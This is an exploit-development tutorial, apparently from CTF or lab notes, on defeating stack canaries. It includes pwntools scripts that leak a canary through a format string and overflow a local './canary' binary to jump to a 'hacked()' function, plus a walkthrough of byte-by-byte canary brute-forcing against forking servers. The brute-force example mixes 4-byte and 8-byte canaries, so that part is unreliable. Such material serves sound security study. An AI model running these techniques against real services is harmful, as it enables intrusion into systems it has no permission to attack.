
# **Canary Bypass**

#### **Overview**
Stack canaries are security mechanisms that prevent buffer overflow attacks by placing a known value (the canary) between the buffer and the return address. If the canary is modified, the stack protector detects the change and terminates the program. To bypass this, an attacker must identify the canary value and craft a payload that preserves it while overwriting the return address.

#### **Steps to Exploit**
1. **Fuzzing the Binary**: Leak the stack canary by sending format strings to identify its location in the stack.
2. **Crafting the Payload**: Once the canary is identified, craft a payload that:
   - Overflows the buffer to reach the return address.
   - Includes the correct canary value.
   - Replaces the return address with the address of a function (e.g., `hacked()`).

#### **Fuzzing Script (Leak Canary)**
```python
from pwn import *

elf = context.binary = ELF('./canary', checksec=False)

# Fuzz to leak the canary value
for i in range(100):
    try:
        p = process(level='error')
        p.sendline(f'%{i}$p'.encode())  # Format string to leak stack value
        p.recvline()
        result = p.recvline().decode()
        if result:
            print(f"{i}: {result.strip()}")
    except EOFError:
        pass
```

#### **Exploit Code (32-bit Example)**
```python
from pwn import *

# Start the program
exe = './canary'
elf = ELF(exe, checksec=False)
context.binary = elf

# Leak the canary value
io = process(exe)
io.sendlineafter(b'!', b'%23$p')  # Adjust format string for canary leak
canary = int(io.recvline().strip(), 16)
info(f"Canary: {hex(canary)}")

# Craft payload
payload = flat(
    b'A' * 64,          # Padding to reach canary
    canary,             # Leaked canary value
    b'A' * 12,          # Padding to return address
    elf.symbols['hacked']  # Address of the target function
)

# Send the payload
io.sendlineafter(b':P', payload)

# Interact with the shell
io.interactive()
```

#### **Key Points**
- **Fuzzing** is used to identify the canary’s position in memory.
- Once the canary is identified, it must be preserved to avoid triggering the stack protector.
- The attacker then **overwrites the return address** to redirect execution to a controlled function.

## **Bruteforcing a Stack Canary**

#### **Overview**
When a program starts, it generates a **canary** (a special value placed on the stack to detect buffer overflows). If the program forks, the child process inherits the same canary. An attacker can exploit this by brute-forcing the canary value byte by byte in a child process, using crashes as an oracle to guess each byte. This technique is often useful in scenarios where the program reads user input (e.g., `read()` or `recv()`) and doesn't append a null byte, such as in **fork-and-accept** servers.

#### **Steps to Brute-Force the Canary**
1. **Fork the Process**: Spawn a child process to work in parallel with the parent.
2. **Send Input to the Child Process**: This input must be crafted to overwrite the canary byte by byte.
3. **Observe the Behavior**: If the child process crashes, the canary byte is incorrect. If no crash occurs, the byte is correct.
4. **Repeat for All Bytes**: This process is repeated for each byte of the canary.

#### **Example Breakdown**
1. **Initial Input**: Send `N` bytes (padding) followed by a guess for the first byte of the canary. For example:
   ```
   Buffer: [N Bytes] + [0x00] (Check if no crash)
   ```
   If no crash occurs, the first byte is correct. If the program crashes, move on to the next byte (0x01, 0x02, etc.).
   
2. **Guessing All Bytes**: This brute-forcing is repeated for each byte of the canary, continuing until all 8 bytes (or more, depending on the architecture) are found.

#### **Example Brute-Forcing Process**

Let’s say the buffer is of size `N` bytes, and we are trying to brute-force a 4-byte canary.

1. **Step 1**: Send the input with the first byte as `0x00`:
   ```
   Buffer = [N Bytes] + [0x00]
   ```
   If the program doesn’t crash, we know that the first byte is correct. If it crashes, increment to the next byte, `0x01`.

2. **Step 2**: Repeat for each subsequent byte:
   ```
   Buffer = [N Bytes] + [0x00] + [0x01] (Check for crash)
   Buffer = [N Bytes] + [0x00] + [0x02] (Check for crash)
   ...
   ```
   
3. **Step 3**: Once we have the correct byte for the first position (e.g., `0x51`), we continue to the next byte and repeat the process:
   ```
   Buffer = [N Bytes] + [0x51] + [Next byte]
   ```

#### **Final Example (Multiple Bytes)**

After brute-forcing, the correct canary value might look like this:
```
Buffer = [N Bytes] + [0x00] + [0x51] + [0xFE] + [0x0A] + [0x31] + [0xD2] + [0x7B] + [0x3C]
```

#### **Important Considerations**
- **Fork-and-Accept Servers**: This technique works well when the server forks for each new connection and when the user input doesn’t append a NULL byte.
- **Crashes as Oracle**: The program’s crash behavior provides feedback on the correctness of the guess.
- **Repeat for Each Byte**: Since the canary is typically 8 bytes, the process involves 8 rounds of bruteforcing.
- **Performance**: This method can be slow, as each byte needs to be tested individually.

---

This method relies on the idea of exploiting process forking and observing program crashes to guess each byte of the canary. It’s particularly effective in **networked services** or **multi-threaded programs** where each new connection results in a new child process inheriting the same canary.
